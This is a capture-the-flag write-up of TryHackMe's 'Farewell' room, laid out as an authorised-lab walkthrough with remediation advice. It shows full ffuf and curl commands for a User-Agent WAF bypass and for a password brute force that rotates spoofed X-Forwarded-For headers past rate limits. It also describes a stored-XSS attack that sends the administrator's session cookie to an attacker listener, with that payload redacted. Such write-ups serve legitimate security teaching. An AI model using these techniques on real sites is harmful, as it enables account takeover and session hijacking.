# Farewell Challenge

![Banner](./../IMAGES/farewell_img.png?raw=true)

**Pathway:** *Web Application Red Teaming* | **Section:** *Bypassing WAF* | **Challenge:** *[Farewell](https://tryhackme.com/room/farewell)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **23 July 2026**.
>
> **Spoiler warning:** This write-up documents the complete exploitation chain, although credentials, exact challenge-specific values, session identifiers, payload details and flag codes are not shown.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The attack was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, usernames, passwords, session identifiers, exact payload components, challenge-specific values or other direct giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **Licence:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

Farewell is a web application red-teaming challenge focused on bypassing a web application firewall and chaining several weaknesses to obtain both normal-user and administrator access.

The application allowed users to submit farewell messages before the fictional server was decommissioned. An administrative panel reviewed those submissions, creating an opportunity to move from normal-user access to an administrator session.

The successful attack chain involved:

1. Confirming VPN routing and local hostname resolution.
2. Enumerating the exposed SSH and HTTP services.
3. Discovering the application's PHP endpoints and client-side JavaScript.
4. Identifying valid usernames from the public activity banner.
5. Bypassing a User-Agent-based WAF rule.
6. Retrieving an exposed password hint from the raw authentication API response.
7. Generating a focused password candidate list.
8. Bypassing per-IP rate limiting by rotating the `X-Forwarded-For` header.
9. Recovering valid normal-user credentials and obtaining the first flag.
10. Confirming that submitted farewell messages were stored for administrator review.
11. Bypassing WAF signatures with an obfuscated stored cross-site scripting payload.
12. Capturing the administrator's non-`HttpOnly` PHP session cookie.
13. Replaying the stolen session against the administrator panel and obtaining the final flag.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: farewell.thm
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> farewell.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts farewell.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important in TryHackMe challenges. Many rooms depend on hostname-based routing, virtual hosts, redirects, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti - technically functional, but not something anybody should be proud of.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/farewell\.thm/d' /etc/hosts
```

The correct mapping can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for confirming VPN routing and the `tun0` address.
- `getent` for validating local hostname resolution.
- `rustscan` and `nmap` for TCP port, service and script enumeration.
- `whatweb` for identifying the web stack.
- `dirsearch`, `gobuster`, `feroxbuster` and `ffuf` for web content discovery.
- cURL for interacting directly with PHP endpoints and maintaining sessions.
- Firefox for observing normal application behaviour.
- `seq`, `sed` and `awk` for generating focused password and spoofed-IP lists.
- FFUF pitchfork mode for pairing one password candidate with one spoofed source address.
- Python 3's HTTP server for receiving the administrator session callback.
- Standard Linux utilities including `grep`, `cat`, `wc` and `tee`.

Click [HERE](https://github.com/Valikahn/TryHackMe-Web-Application-Red-Teaming#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

A rapid service scan was performed:

```bash
rustscan -a farewell.thm --ulimit 5000 -- -sC -sV -Pn
```

A second Nmap scan confirmed the findings:

```bash
nmap -sC -sV -Pn farewell.thm
```

The principal exposed services were:

```text
22/tcp open  ssh
80/tcp open  http
```

Service detection identified OpenSSH on Ubuntu and Apache HTTP Server. The HTTP service presented the Farewell login application.

### Web Technology Identification

WhatWeb identified the main web technologies:

```bash
whatweb -a 3 farewell.thm/
```

Relevant findings included:

```text
Apache
PHPSESSID
Password field
JavaScript
Matomo
```

The presence of `PHPSESSID` indicated PHP session handling. Later inspection confirmed that the session cookie was not protected with the `HttpOnly` attribute, which became critical during the stored-XSS stage.

### Web Content Discovery

Several content-discovery tools were used to compare behaviour and identify protected endpoints.

```bash
dirsearch -u farewell.thm/
```

```bash
gobuster dir \
  -u http://farewell.thm/ \
  -w /usr/share/wordlists/dirb/big.txt
```

```bash
feroxbuster \
  -u http://farewell.thm/ \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,txt,html,py \
  -t 50 \
  -k \
  -C 404 \
  --redirects
```

```bash
ffuf \
  -u 'http://farewell.thm/FUZZ' \
  -w /usr/share/wordlists/dirb/big.txt \
  -mc all \
  -t 100 \
  -ic \
  -fc 404 \
  -e .php,.txt,.html,.py
```

Important endpoints included:

```text
/admin.php
/auth.php
/dashboard.php
/check.js
/info.php
/logout.php
/status.php
```

Some tools received `403 Forbidden` responses for endpoints that others could identify. This inconsistency suggested that the WAF was evaluating request characteristics rather than applying a simple path-based block.

### Exposed PHP Information

The `info.php` endpoint exposed a full `phpinfo()` page:

```bash
curl -i -s http://farewell.thm/info.php
```

The page disclosed extensive server and PHP configuration details, including:

- Apache and PHP versions.
- The document root.
- Enabled extensions.
- Session configuration.
- The absence of `session.cookie_httponly`.
- The remote client and server addresses.
- Loaded Apache modules, including ModSecurity.

The most important security detail was:

```text
session.cookie_httponly = Off
```

This meant JavaScript executing within the application's origin could access `document.cookie`.

### Client-Side JavaScript Review

The login JavaScript was downloaded and reviewed:

```bash
curl -i -s http://farewell.thm/check.js
```

The script submitted credentials to `/auth.php` and parsed a JSON response. When authentication failed for a valid user, the API returned a `password_hint` object.

However, the client-side code replaced the actual hint with the generic message:

```text
Invalid password against the user
```

This created a discrepancy between what the server returned and what the browser displayed.

### Username Enumeration

The public activity banner identified three active accounts:

```text
<REDACTED>
<REDACTED>
<REDACTED>
```

These usernames were treated as likely valid application accounts. Direct requests to the authentication API were then used to test how the server responded to invalid passwords.

## Exploits

### User-Agent WAF Bypass

A direct cURL request to `/auth.php` was initially blocked:

```bash
curl -s -X POST http://farewell.thm/auth.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=<REDACTED>&password=invalid'
```

The server returned:

```text
403 - Access Forbidden
WAF is Active
```

The same request succeeded after adding a browser-style User-Agent:

```bash
curl -s -X POST http://farewell.thm/auth.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:<REDACTED>) Gecko/20100101 Firefox/<REDACTED>' \
  --data 'username=<REDACTED>&password=invalid'
```

This reached the application and returned JSON instead of the WAF page.

The behaviour showed that the WAF trusted a superficial client header. Requests using cURL's default User-Agent were blocked, while those claiming to originate from Firefox were allowed.

### Password Hint Disclosure

The raw JSON response disclosed the selected account's password construction rule:

```json
{
  "error": "auth_failed",
  "user": {
    "name": "<REDACTED>",
    "last_password_change": "<REDACTED>",
    "password_hint": "<REDACTED>"
  }
}
```

The exact hint has been redacted because it directly narrows the credential search space. It described a fixed word followed by four digits, reducing the possible passwords to 10,000 candidates.

A focused list was generated:

```bash
seq -w 0 9999 | sed 's/^/<REDACTED>/' > normal-user-passwords.txt
```

The resulting file contained candidates following the required pattern:

```text
<REDACTED>0000
<REDACTED>0001
<REDACTED>0002
...
<REDACTED>9999
```

### Trusting `X-Forwarded-For`

A test request supplied an attacker-controlled source address:

```bash
curl -s -X POST http://farewell.thm/auth.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:<REDACTED>) Gecko/20100101 Firefox/<REDACTED>' \
  -H 'X-Forwarded-For: <REDACTED>' \
  --data 'username=<REDACTED>&password=<REDACTED>'
```

The request reached the normal authentication logic, confirming that the WAF accepted the user-supplied `X-Forwarded-For` value as the apparent client address.

A list of 10,000 unique spoofed addresses was generated:

```bash
seq 0 9999 | awk '{printf "10.10.%d.%d\n", int($1/256), $1%256}' > xff-ips.txt
```

The file length was verified:

```bash
wc -l xff-ips.txt
```

```text
10000 xff-ips.txt
```

### WAF Rate-Limit Bypass with FFUF Pitchfork Mode

FFUF was configured with two wordlists:

- One password candidate list.
- One spoofed `X-Forwarded-For` list.

Pitchfork mode paired each password with a unique source IP:

```bash
ffuf \
  -u http://farewell.thm/auth.php \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:<REDACTED>) Gecko/20100101 Firefox/<REDACTED>' \
  -H 'X-Forwarded-For: IP' \
  -d 'username=<REDACTED>&password=PASS' \
  -w normal-user-passwords.txt:PASS \
  -w xff-ips.txt:IP \
  -mode pitchfork \
  -mr '"success":true' \
  -t 20
```

Each password attempt therefore appeared to originate from a different client. This bypassed the per-IP rate limit and identified a valid credential pair:

```text
Username: <REDACTED>
Password: <REDACTED>
```

### Normal-User Authentication

The valid credentials were submitted while saving the returned session cookie:

```bash
curl -s -c normal-user.cookies \
  -X POST http://farewell.thm/auth.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:<REDACTED>) Gecko/20100101 Firefox/<REDACTED>' \
  -H 'X-Forwarded-For: <REDACTED>' \
  --data 'username=<REDACTED>&password=<REDACTED>'
```

The response confirmed successful authentication:

```json
{"success":true,"redirect":"\/dashboard.php"}
```

The dashboard was requested with the saved cookie:

```bash
curl -s -b normal-user.cookies http://farewell.thm/dashboard.php
```

The first flag was displayed in the dashboard:

```text
THM{....}
```

### Administrator Page Behaviour

Requesting `/admin.php` with the normal-user session and cURL's default User-Agent returned the generic WAF page.

Adding a Firefox User-Agent allowed the request to reach the PHP application:

```bash
curl -i -s -b normal-user.cookies \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:<REDACTED>) Gecko/20100101 Firefox/<REDACTED>' \
  http://farewell.thm/admin.php
```

The server returned:

```text
HTTP/1.1 302 Found
Location: dashboard.php
```

The response body still contained the administrator page template, indicating that the script issued a redirect but did not immediately terminate execution. The sensitive administrator data was not populated for the normal user, but the behaviour confirmed the endpoint and its role check.

### Stored Message Confirmation

A harmless marker was submitted through the authenticated dashboard:

```bash
curl -i -s -b normal-user.cookies \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:<REDACTED>) Gecko/20100101 Firefox/<REDACTED>' \
  -X POST http://farewell.thm/dashboard.php \
  --data-urlencode 'farewell_message=<REDACTED>'
```

The response confirmed that the message was stored:

```text
Your farewell message has been saved.
Status: Pending Review
```

This demonstrated that user-controlled content would later be loaded by an administrator.

### Stored XSS WAF Bypass

Straightforward payloads using obvious combinations such as `<script>`, `<img>`, `onerror` and `document.cookie` were blocked by the WAF.

The successful approach used an obfuscated iframe-based JavaScript URI. The payload relied on:

- HTML entity decoding to reconstruct a blocked keyword.
- String concatenation to reconstruct `document`.
- String concatenation to reconstruct `cookie`.
- A protocol-relative callback to the Kali `tun0` address.

The exact challenge-working payload is intentionally redacted:

```html
<iframe src="<REDACTED>">
```

A listener was started on the Kali VM:

```bash
cd /tmp/VK/
python3 -m http.server 8000 --bind <TUN0_IP>
```

The expected listener output was:

```text
Serving HTTP on <TUN0_IP> port 8000
```

The obfuscated payload was submitted using the authenticated normal-user session:

```bash
curl -sS -i -b normal-user.cookies \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:<REDACTED>) Gecko/20100101 Firefox/<REDACTED>' \
  --data-urlencode "farewell_message=<iframe src=\"<REDACTED>\">" \
  http://farewell.thm/dashboard.php
```

When the administrator reviewed the pending message, the browser executed the reconstructed JavaScript and sent its cookie to the listener:

```text
<TARGET_IP> - - [<REDACTED>] "GET /PHPSESSID=<REDACTED> HTTP/1.1" 404 -
```

The `404` response was irrelevant. The critical result was the administrator's PHP session identifier appearing in the request path.

### Administrator Session Replay

The stolen session was replayed directly against `/admin.php`:

```bash
curl -s \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:<REDACTED>) Gecko/20100101 Firefox/<REDACTED>' \
  -H 'Cookie: PHPSESSID=<REDACTED>' \
  http://farewell.thm/admin.php
```

The returned page confirmed:

```text
Logged in as admin
Flag: THM{....}
```

This completed the room without recovering the administrator's password. The attack instead hijacked an already authenticated administrator session.

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The target route and `tun0` address were confirmed. The hostname `farewell.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring that the application was accessed through its expected hostname.

### 2. Service Discovery
RustScan and Nmap identified SSH and Apache HTTP services. No additional externally exposed TCP services were needed for the attack chain.

### 3. Web Enumeration
Directory discovery exposed the authentication handler, dashboard, administrator panel, JavaScript file, PHP information page and service-reset page.

### 4. Client-Side Review
Reviewing `check.js` showed that the server returned a detailed password hint but the browser intentionally replaced it with a generic message.

### 5. Username Enumeration
The activity banner exposed several valid usernames. One account had a password hint that restricted the password format to a fixed prefix and four digits.

### 6. User-Agent WAF Bypass
Direct cURL requests were blocked. Supplying a Firefox-style User-Agent allowed requests to pass through the WAF to the PHP application.

### 7. Password Candidate Generation
A targeted list of 10,000 candidates was created from the disclosed password pattern rather than using a broad generic password dictionary.

### 8. Rate-Limit Bypass
The WAF trusted attacker-controlled `X-Forwarded-For` values. FFUF pitchfork mode paired every password candidate with a unique spoofed address, preventing the per-IP limit from stopping the attack.

### 9. Normal-User Access
A valid credential pair was recovered and used to create an authenticated PHP session. The first dashboard flag was obtained:

```text
THM{....}
```

### 10. Stored Input Identification
A harmless farewell message was submitted and appeared as pending administrator review. This confirmed a stored input path from a normal user into the administrator interface.

### 11. Stored-XSS Filter Testing
Direct XSS payloads were blocked by WAF signatures. The final payload used browser decoding and JavaScript string reconstruction to avoid literal blocked patterns.

### 12. Administrator Cookie Theft
The administrator review process loaded the stored payload. Because `PHPSESSID` lacked the `HttpOnly` attribute, JavaScript could read it and send it to `<TUN0_IP>`.

### 13. Session Hijacking
The stolen administrator session was replayed in a request to `/admin.php`. The server accepted it as an authenticated administrator session.

### 14. Final Objective
The administrator panel disclosed the second flag:

```text
THM{....}
```

## Key Lessons

Farewell demonstrated several important web application red-teaming and defensive-security lessons:

- Confirm VPN routing and hostname resolution before troubleshooting web behaviour.
- Keep `/etc/hosts` tidy when using a personal Kali VM for TryHackMe rooms.
- Different tools may receive different responses when a WAF evaluates headers and request structure.
- A browser-style User-Agent is not proof that a request originated from a browser.
- Client-side JavaScript should never be relied upon to conceal sensitive server response data.
- Password hints can reduce a password search space to a trivial size.
- Focused candidate generation is often more efficient than using a large generic wordlist.
- Reverse proxies and WAFs must not trust `X-Forwarded-For` from arbitrary clients.
- Rate limiting must be bound to a trustworthy client identity and reinforced with account-level controls.
- FFUF pitchfork mode is useful when two input values must advance together.
- A redirect does not necessarily stop PHP execution unless the script explicitly terminates.
- Stored user content should be treated as untrusted wherever it is rendered.
- Signature-only XSS filtering is fragile because browsers perform entity decoding and JavaScript expression evaluation.
- Session cookies should be protected with `HttpOnly`, `Secure` and an appropriate `SameSite` policy.
- Session theft can provide administrator access without ever recovering the administrator's password.
- Public write-ups should explain the technique without publishing exact credentials, flags, session identifiers or challenge-solving payloads.

The most important lesson was that the WAF did not remove the underlying vulnerabilities. It introduced obstacles based on superficial request patterns, while the application still disclosed password hints, trusted spoofable headers, stored unsafe content and exposed a JavaScript-readable session cookie.

## Remediation Notes

### Hostname and Deployment Hygiene

- Document required hostnames and virtual-host configurations.
- Avoid exposing diagnostic pages such as `phpinfo()` in production.
- Remove temporary reset and status endpoints before deployment.
- Keep development and challenge-only routes separate from the live application.
- Review stale DNS and hosts-file mappings during testing.

### WAF Configuration

- Do not use the User-Agent as an authentication or trust signal.
- Treat WAF rules as defence in depth rather than a substitute for secure application code.
- Normalise and decode request data before applying detection rules.
- Inspect equivalent content types consistently, including URL-encoded and multipart requests.
- Monitor repeated authentication attempts across multiple apparent source IPs.
- Correlate requests using account, session, device and behavioural signals.
- Test WAF rules against common encoding, entity and parser-differential techniques.
- Log blocked requests with enough context for investigation without exposing secrets.

### Authentication and Password Policy

- Remove password hints that reveal predictable construction rules.
- Use strong, unique passwords that are not based on locations, names or short numeric suffixes.
- Apply account-level rate limiting in addition to network-level throttling.
- Introduce exponential back-off and temporary account protection after repeated failures.
- Require multi-factor authentication for administrative accounts.
- Monitor distributed password attacks where each request uses a different apparent source.
- Return a uniform authentication failure response for valid and invalid usernames.

### Proxy Header Security

- Accept `X-Forwarded-For` only from explicitly trusted reverse proxies.
- Strip client-supplied forwarding headers at the network edge.
- Configure the application and WAF to use the actual transport-layer peer unless a trusted proxy is present.
- Validate the entire proxy chain before deriving the original client address.
- Avoid making security decisions solely from a user-controlled HTTP header.

### Cross-Site Scripting Prevention

- Encode user-controlled data for the exact HTML output context.
- Use a mature templating engine with automatic output escaping.
- Sanitise any content that is intentionally allowed to contain limited HTML.
- Reject or remove dangerous elements, attributes, URL schemes and event handlers.
- Apply a strict Content Security Policy that blocks inline JavaScript and untrusted destinations.
- Avoid rendering untrusted content through `innerHTML`.
- Test stored content in every privileged interface where it may later be displayed.
- Do not rely on blacklists of strings such as `script`, `onerror` or `document.cookie`.

### Session Security

- Set session cookies with `HttpOnly`.
- Set `Secure` when the application is served over HTTPS.
- Apply an appropriate `SameSite` value.
- Regenerate the session identifier after login and privilege changes.
- Use short administrator session lifetimes.
- Revoke sessions after suspicious activity or privilege-sensitive events.
- Bind sensitive actions to CSRF protection and re-authentication where appropriate.
- Avoid placing session identifiers in URLs, logs or client-visible content.

A hardened PHP session configuration should include settings similar to:

```ini
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = "Lax"
session.use_strict_mode = 1
```

### Administrative Interface Security

- Require server-side role checks on every administrator request.
- Call `exit` immediately after issuing an access-control redirect.
- Separate the administrator interface from public user content where practical.
- Review untrusted submissions in a sandboxed or text-only interface.
- Apply least privilege to automated review accounts.
- Avoid allowing administrator browsers to make unrestricted outbound requests.
- Record and alert on unexpected administrator session use.

### Operational Monitoring

- Alert on rapid authentication attempts using rotating forwarding headers.
- Detect repeated requests that differ only by password and apparent client IP.
- Monitor outbound requests from administrator review sessions.
- Log message creation, review and approval events.
- Record session creation, privilege level and invalidation events.
- Remove public diagnostic endpoints and verify this during deployment reviews.
- Maintain separate working directories for scan output, candidate files and captured evidence.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
